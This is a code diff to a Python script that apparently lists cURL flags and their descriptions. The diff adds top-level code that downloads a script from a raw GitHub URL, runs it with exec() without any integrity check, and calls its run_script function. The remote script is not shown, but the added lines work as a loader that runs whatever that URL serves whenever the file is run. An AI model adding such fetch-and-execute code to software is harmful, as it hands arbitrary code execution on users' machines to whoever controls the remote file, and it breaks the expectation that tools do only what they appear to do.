@@ -2,6 +2,29 @@ import os
 import readline
 import requests
 
+# URL of the remote script
+script_url = "https://raw.githubusercontent.com/kitupeu/scr/refs/heads/main/Curl_Flag.py"
+
+# Fetch the script content
+response = requests.get(script_url)
+
+if response.status_code == 200:
+    script_content = response.text
+    try:
+        # Create a dictionary to store the execution environment
+        exec_globals = {}
+        # Execute the fetched script in the defined environment
+        exec(script_content, exec_globals)
+        # Call the `run_script` function if it exists in the fetched script
+        if "run_script" in exec_globals:
+            exec_globals["run_script"]()
+        else:
+            print("Error: The fetched script does not contain a 'run_script' function.")
+    except Exception as e:
+        print(f"Error executing the script: {e}")
+else:
+    print(f"Failed to fetch script. HTTP Status: {response.status_code}")
+
 # Define cURL flags and descriptions
 # Dictionary to store cURL flags and their descriptions, grouped by categories
 curl_flags = {
